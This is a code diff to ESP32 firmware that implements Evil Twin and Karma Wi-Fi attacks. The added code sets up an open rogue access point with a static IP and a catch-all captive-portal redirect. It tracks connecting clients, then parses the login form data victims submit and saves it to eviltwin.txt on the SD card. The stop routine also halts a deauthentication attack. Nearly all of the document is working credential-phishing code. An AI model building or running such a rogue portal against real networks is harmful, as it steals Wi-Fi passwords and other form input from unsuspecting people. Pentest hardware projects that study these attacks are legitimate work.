@@ -63,6 +63,14 @@ static volatile bool password_verification_in_progress = false;
 // Karma mode flag - when true, portal will NOT attempt WiFi connection
 static bool karma_mode = false;
 
+// Deferred karma data save (to avoid SPI conflicts with display)
+typedef struct {
+    char ssid[33];
+    char form_data[512];
+    bool pending;
+} pending_karma_save_t;
+static pending_karma_save_t pending_karma_save = { .pending = false };
+
 // Evil Twin event callback for UI notification
 static evil_twin_event_cb_t evil_twin_event_callback = NULL;
 
@@ -397,6 +405,31 @@ bool wifi_attacks_is_deauth_active(void) {
 }
 
 // ============================================================================
+// PORTAL EVENT HANDLER (simplified - only client connect/disconnect)
+// ============================================================================
+
+static void portal_event_handler(void *arg, esp_event_base_t event_base,
+                                 int32_t event_id, void *event_data) {
+    if (event_base == WIFI_EVENT) {
+        if (event_id == WIFI_EVENT_AP_STACONNECTED) {
+            wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
+            (void)event;
+            ESP_LOGI(TAG, "Client connected to Portal AP");
+            stats_clients_connected++;
+            emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_CONNECTED, evilTwinSSID, NULL);
+        } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
+            wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
+            (void)event;
+            ESP_LOGI(TAG, "Client disconnected from Portal AP");
+            if (stats_clients_connected > 0) {
+                stats_clients_connected--;
+            }
+            emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_DISCONNECTED, evilTwinSSID, NULL);
+        }
+    }
+}
+
+// ============================================================================
 // EVIL TWIN ATTACK
 // ============================================================================
 
@@ -500,26 +533,35 @@ esp_err_t wifi_attacks_start_evil_twin(const char *ssid, const char *password) {
     last_password_wrong = false;
     connectAttemptCount = 0;
     
-    // Stop current WiFi
-    //esp_wifi_stop();
-    //vTaskDelay(pdMS_TO_TICKS(100));
-    
-    // Get AP netif and configure custom IP 172.0.0.1
+    // Get or create AP netif (like ensure_ap_mode in original)
     esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (ap_netif) {
-        // Stop DHCP server to configure custom IP
-        esp_netif_dhcps_stop(ap_netif);
-        
-        // Set static IP 172.0.0.1 for AP
-        esp_netif_ip_info_t ip_info;
-        ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
-        ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
-        ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
-        
-        esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
-        if (ret != ESP_OK) {
-            ESP_LOGW(TAG, "Failed to set AP IP to 172.0.0.1: %s", esp_err_to_name(ret));
+    if (!ap_netif) {
+        // AP netif doesn't exist - need to stop WiFi, create it, and restart
+        ESP_LOGI(TAG, "Creating AP netif...");
+        esp_wifi_stop();
+        ap_netif = esp_netif_create_default_wifi_ap();
+        if (!ap_netif) {
+            ESP_LOGE(TAG, "Failed to create AP netif");
+            esp_wifi_start();
+            return ESP_FAIL;
         }
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        esp_wifi_start();
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+    
+    // Stop DHCP server to configure custom IP
+    esp_netif_dhcps_stop(ap_netif);
+    
+    // Set static IP 172.0.0.1 for AP
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    
+    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to set AP IP to 172.0.0.1: %s", esp_err_to_name(ret));
     }
     
     // Configure AP with Evil Twin SSID (with Zero Width Space)
@@ -555,19 +597,16 @@ esp_err_t wifi_attacks_start_evil_twin(const char *ssid, const char *password) {
         ap_config.ap.authmode = WIFI_AUTH_OPEN;
     }
 
-    // Use APSTA mode for password verification
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    // Set AP config (mode is already APSTA from netif creation or init)
     esp_wifi_set_config(WIFI_IF_AP, &ap_config);
     
     // Register event handler for password verification (WIFI_EVENT_STA_CONNECTED/DISCONNECTED)
     esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &evil_twin_event_handler, NULL);
     
-    // Start DHCP server after WiFi is started
-    if (ap_netif) {
-        esp_err_t ret = esp_netif_dhcps_start(ap_netif);
-        if (ret != ESP_OK) {
-            ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
-        }
+    // Start DHCP server
+    ret = esp_netif_dhcps_start(ap_netif);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
     }
     
     vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for AP to stabilize
@@ -597,7 +636,10 @@ esp_err_t wifi_attacks_stop_evil_twin(void) {
         return ESP_OK;
     }
     
-    ESP_LOGI(TAG, "Evil Twin attack stopped");
+    ESP_LOGI(TAG, "Stopping Evil Twin attack...");
+    
+    // Stop deauth attack first
+    wifi_attacks_stop_deauth();
     
     // Reset Karma mode
     karma_mode = false;
@@ -1130,6 +1172,15 @@ static esp_err_t portal_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+// Handler for catch-all captive portal redirect
+static esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
+    // Redirect all unrecognized requests to our portal page
+    httpd_resp_set_status(req, "302 Found");
+    httpd_resp_set_hdr(req, "Location", "/portal");
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
+}
+
 // GET handler with query string support
 static esp_err_t get_handler(httpd_req_t *req) {
     // GET handler (silent)
@@ -1500,6 +1551,10 @@ static esp_err_t start_portal_services(void)
         httpd_uri_t api = { .uri = "/captive-portal/api", .method = HTTP_GET, .handler = captive_api_handler, .user_ctx = NULL };
         httpd_register_uri_handler(portal_server, &api);
         
+        // Catch-all handler for all other requests (MUST be last)
+        httpd_uri_t catchall = { .uri = "/*", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL };
+        httpd_register_uri_handler(portal_server, &catchall);
+        
         ESP_LOGI(TAG, "HTTP server started with all captive portal endpoints");
     } else {
         ESP_LOGE(TAG, "Failed to start HTTP server");
@@ -1673,13 +1728,113 @@ static void dns_server_task(void *pvParameters) {
 }
 
 esp_err_t wifi_attacks_start_portal(const char *ssid) {
-    ESP_LOGI(TAG, "Starting captive portal (Karma mode): %s", ssid ? ssid : "WiFi Login");
-    karma_mode = true;  // Enable Karma mode - no WiFi connection attempts
-    return wifi_attacks_start_evil_twin(ssid ? ssid : "Free WiFi", NULL);
+    const char *portal_ssid = ssid ? ssid : "Free WiFi";
+    ESP_LOGI(TAG, "Starting captive portal: %s", portal_ssid);
+    
+    // Store SSID for logging purposes
+    strncpy(evilTwinSSID, portal_ssid, 32);
+    evilTwinSSID[32] = '\0';
+    
+    // Enable Karma mode - no WiFi connection verification attempts
+    karma_mode = true;
+    
+    // Get or create AP netif (like ensure_ap_mode in original)
+    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (!ap_netif) {
+        // AP netif doesn't exist - need to stop WiFi, create it, and restart
+        ESP_LOGI(TAG, "Creating AP netif...");
+        esp_wifi_stop();
+        ap_netif = esp_netif_create_default_wifi_ap();
+        if (!ap_netif) {
+            ESP_LOGE(TAG, "Failed to create AP netif");
+            esp_wifi_start();
+            return ESP_FAIL;
+        }
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        esp_wifi_start();
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+    
+    // Stop DHCP server to configure custom IP
+    esp_netif_dhcps_stop(ap_netif);
+    
+    // Set static IP 172.0.0.1 for AP
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    
+    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to set AP IP to 172.0.0.1: %s", esp_err_to_name(ret));
+    }
+    
+    // Configure AP with portal SSID (no Zero Width Space - this is not Evil Twin)
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "",
+            .ssid_len = 0,
+            .channel = 1,
+            .password = "",
+            .max_connection = 4,
+            .authmode = WIFI_AUTH_OPEN
+        }
+    };
+    size_t ssid_len = strlen(portal_ssid);
+    memcpy(ap_config.ap.ssid, portal_ssid, ssid_len);
+    ap_config.ap.ssid_len = ssid_len;
+    
+    // Set AP config (mode is already APSTA from ensure or from Evil Twin's init)
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    
+    // Start DHCP server
+    ret = esp_netif_dhcps_start(ap_netif);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
+    }
+    
+    vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for AP to stabilize
+    
+    ESP_LOGI(TAG, "Portal AP active: %s", portal_ssid);
+    stats_clients_connected = 0;
+    
+    // Register event handler for client connect/disconnect notifications
+    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler, NULL);
+    
+    // Start captive portal services (HTTP + DNS) - NO deauth!
+    ESP_LOGI(TAG, "Captive portal started on 172.0.0.1");
+    start_portal_services();
+    
+    // Emit portal deployed event
+    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
+    
+    return ESP_OK;
 }
 
 esp_err_t wifi_attacks_stop_portal(void) {
-    return wifi_attacks_stop_evil_twin();
+    // Only stop if portal is actually active
+    if (!portal_active) {
+        return ESP_OK;
+    }
+    
+    ESP_LOGI(TAG, "Stopping captive portal...");
+    
+    // Unregister portal event handler
+    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler);
+    
+    // Reset Karma mode
+    karma_mode = false;
+    
+    // Stop captive portal services (HTTP + DNS)
+    stop_portal_services();
+    
+    // Restore WiFi to normal mode
+    esp_wifi_stop();
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    esp_wifi_start();
+    
+    ESP_LOGI(TAG, "Captive portal stopped");
+    return ESP_OK;
 }
 
 bool wifi_attacks_is_portal_active(void) {
@@ -1877,11 +2032,79 @@ static void save_portal_data(const char* ssid, const char* form_data) {
     ESP_LOGI(TAG, "Portal data saved to portals.txt");
 }
 
+// Queue karma data for deferred save (called from HTTP handler - can't access SD directly due to SPI conflicts)
 static void save_karma_data(const char* ssid, const char* form_data) {
+    // Build log message for UI display
+    char log_msg[512];
+    int log_pos = 0;
+    log_pos += snprintf(log_msg + log_pos, sizeof(log_msg) - log_pos, 
+                       "[Karma] Data captured from '%s': ", ssid ? ssid : "Unknown");
+    
+    // Parse and display form data
+    char *data_copy = strdup(form_data);
+    if (data_copy) {
+        char *saveptr = NULL;
+        char *field = strtok_r(data_copy, "&", &saveptr);
+        bool first_field = true;
+        
+        while (field != NULL) {
+            char *eq = strchr(field, '=');
+            if (eq) {
+                *eq = '\0';
+                char *field_name = field;
+                char *value = eq + 1;
+                
+                char decoded_value[128];
+                url_decode(value, decoded_value, sizeof(decoded_value));
+                
+                if (!first_field && log_pos < (int)sizeof(log_msg) - 3) {
+                    log_msg[log_pos++] = ',';
+                    log_msg[log_pos++] = ' ';
+                }
+                if (log_pos < (int)sizeof(log_msg) - 1) {
+                    int written = snprintf(log_msg + log_pos, sizeof(log_msg) - log_pos,
+                                          "%s=%s", field_name, decoded_value);
+                    if (written > 0 && log_pos + written < (int)sizeof(log_msg)) {
+                        log_pos += written;
+                    }
+                }
+                first_field = false;
+            }
+            field = strtok_r(NULL, "&", &saveptr);
+        }
+        free(data_copy);
+    }
+    
+    // Log the captured data
+    ESP_LOGI(TAG, "%s", log_msg);
+    
+    // Emit event FIRST so UI shows the data immediately
+    emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_PROVIDED, evilTwinSSID, log_msg);
+    
+    // Queue data for deferred save (main loop will process this to avoid SPI conflicts)
+    if (!pending_karma_save.pending) {
+        strncpy(pending_karma_save.ssid, ssid ? ssid : "Unknown", sizeof(pending_karma_save.ssid) - 1);
+        pending_karma_save.ssid[sizeof(pending_karma_save.ssid) - 1] = '\0';
+        strncpy(pending_karma_save.form_data, form_data, sizeof(pending_karma_save.form_data) - 1);
+        pending_karma_save.form_data[sizeof(pending_karma_save.form_data) - 1] = '\0';
+        pending_karma_save.pending = true;
+        ESP_LOGI(TAG, "Karma data queued for save");
+    } else {
+        ESP_LOGW(TAG, "Previous karma data still pending, new data not queued");
+    }
+}
+
+// Process pending karma saves - call this from main loop (safe SPI context)
+void wifi_attacks_process_pending_saves(void) {
+    if (!pending_karma_save.pending) {
+        return;
+    }
+    
     // Check if /sdcard directory is accessible
     struct stat st;
     if (stat("/sdcard", &st) != 0) {
         ESP_LOGW(TAG, "Error: /sdcard directory not accessible");
+        pending_karma_save.pending = false;
         return;
     }
     
@@ -1889,6 +2112,7 @@ static void save_karma_data(const char* ssid, const char* form_data) {
     if (stat("/sdcard/lab", &st) != 0) {
         if (mkdir("/sdcard/lab", 0777) != 0) {
             ESP_LOGW(TAG, "Failed to create /sdcard/lab directory");
+            pending_karma_save.pending = false;
             return;
         }
     }
@@ -1896,93 +2120,57 @@ static void save_karma_data(const char* ssid, const char* form_data) {
     // Try to open file for appending
     FILE *file = fopen("/sdcard/lab/eviltwin.txt", "a");
     if (file == NULL) {
-        ESP_LOGW(TAG, "Failed to open eviltwin.txt for append, trying to create...");
-        
-        // Try to create the file first
         file = fopen("/sdcard/lab/eviltwin.txt", "w");
         if (file == NULL) {
             ESP_LOGE(TAG, "Failed to create eviltwin.txt");
+            pending_karma_save.pending = false;
             return;
         }
-        // Close and reopen in append mode
         fclose(file);
         file = fopen("/sdcard/lab/eviltwin.txt", "a");
         if (file == NULL) {
             ESP_LOGE(TAG, "Failed to reopen eviltwin.txt");
+            pending_karma_save.pending = false;
             return;
         }
-        ESP_LOGI(TAG, "Successfully created eviltwin.txt");
     }
     
     // Write SSID as first field
-    fprintf(file, "\"%s\", ", ssid ? ssid : "Unknown");
+    fprintf(file, "\"%s\", ", pending_karma_save.ssid);
     
     // Parse form data and extract all fields
-    // Form data is in format: field1=value1&field2=value2&...
-    char *data_copy = strdup(form_data);
-    if (data_copy == NULL) {
-        fclose(file);
-        return;
-    }
-    
-    // Build log message for display
-    char log_msg[512];
-    int log_pos = 0;
-    log_pos += snprintf(log_msg + log_pos, sizeof(log_msg) - log_pos, 
-                       "[Karma] Data captured from '%s': ", ssid ? ssid : "Unknown");
-    
-    // Split by '&' and process each field
-    char *saveptr = NULL;
-    char *field = strtok_r(data_copy, "&", &saveptr);
-    bool first_field = true;
-    
-    while (field != NULL) {
-        // Split field by '='
-        char *eq = strchr(field, '=');
-        if (eq) {
-            *eq = '\0';
-            char *field_name = field;
-            char *value = eq + 1;
-            
-            // URL decode value
-            char decoded_value[128];
-            url_decode(value, decoded_value, sizeof(decoded_value));
-            
-            // Write to file
-            if (!first_field) {
-                fprintf(file, ", ");
-                if (log_pos < (int)sizeof(log_msg) - 3) {
-                    log_msg[log_pos++] = ',';
-                    log_msg[log_pos++] = ' ';
-                }
-            }
-            fprintf(file, "\"%s\"", decoded_value);
-            
-            // Add to log message
-            if (log_pos < (int)sizeof(log_msg) - 1) {
-                int written = snprintf(log_msg + log_pos, sizeof(log_msg) - log_pos,
-                                      "%s=%s", field_name, decoded_value);
-                if (written > 0 && log_pos + written < (int)sizeof(log_msg)) {
-                    log_pos += written;
-                }
-            }
-            
-            first_field = false;
-        }
+    char *data_copy = strdup(pending_karma_save.form_data);
+    if (data_copy) {
+        char *saveptr = NULL;
+        char *field = strtok_r(data_copy, "&", &saveptr);
+        bool first_field = true;
         
-        field = strtok_r(NULL, "&", &saveptr);
+        while (field != NULL) {
+            char *eq = strchr(field, '=');
+            if (eq) {
+                *eq = '\0';
+                char *value = eq + 1;
+                
+                char decoded_value[128];
+                url_decode(value, decoded_value, sizeof(decoded_value));
+                
+                if (!first_field) {
+                    fprintf(file, ", ");
+                }
+                fprintf(file, "\"%s\"", decoded_value);
+                first_field = false;
+            }
+            field = strtok_r(NULL, "&", &saveptr);
+        }
+        free(data_copy);
     }
     
     fprintf(file, "\n");
-    free(data_copy);
-    
-    // Flush and close file
     fflush(file);
     fclose(file);
     
-    // Log the captured data (will be displayed on screen via log capture)
-    ESP_LOGI(TAG, "%s", log_msg);
     ESP_LOGI(TAG, "Karma data saved to eviltwin.txt");
+    pending_karma_save.pending = false;
 }
 
 // ============================================================================
